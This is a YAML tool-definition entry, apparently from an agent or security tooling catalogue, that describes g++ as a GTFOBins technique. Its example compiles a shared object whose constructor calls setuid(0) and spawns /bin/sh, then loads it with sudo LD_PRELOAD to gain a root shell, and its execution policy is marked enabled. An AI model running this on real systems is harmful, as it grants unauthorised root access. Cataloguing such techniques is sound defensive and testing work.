---
id: build-compiler-gxx
namespace: build:compiler:gxx
name: g++
description: GNU C++ compiler, can execute code and spawn shells via compiled shared objects.
author: "GTFOBins"
version: "1.0.0"
capabilities:
  - security.privilege-escalation.shell
  - security.execution.command
platforms:
  - linux
  - macos
  - bsd
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - gcc
  - cc
artifacts: []
workflow_edges:
  produces:
    - shell-access
    - command-execution
  consumes:
    - execution-context
contract:
  inputs: []
  outputs:
    - type: process.output
      description: Shell output
  side_effects:
    - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
  - g++
  - gcc
  - Bash
  - execFile
parameters: []
features:
  - process-manip
execution:
  template: "g++ -shared -o /tmp/x.so -fPIC /path/to/src && g++ -o /dev/null -Wl,--no-as-needed -ldl /dev/null"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Spawn a shell via g++ compiled shared object
    command: |
      echo '#include <stdlib.h>' >x.cc
      echo 'void __attribute__((constructor)) x() { setuid(0); system("/bin/sh"); }' >>x.cc
      g++ -shared -o /tmp/x.so -fPIC x.cc
      sudo LD_PRELOAD=/tmp/x.so g++ -o /dev/null -Wl,--no-as-needed -ldl /dev/null
references:
  - label: "GTFOBins"
    url: "https://gtfobins.github.io/gtfobins/g++/"
techniques:
  - privilege-escalation
  - execution
install:
  - method: apt
    package_name: "g++"
    commands:
      - "apt-get install -y g++"
---
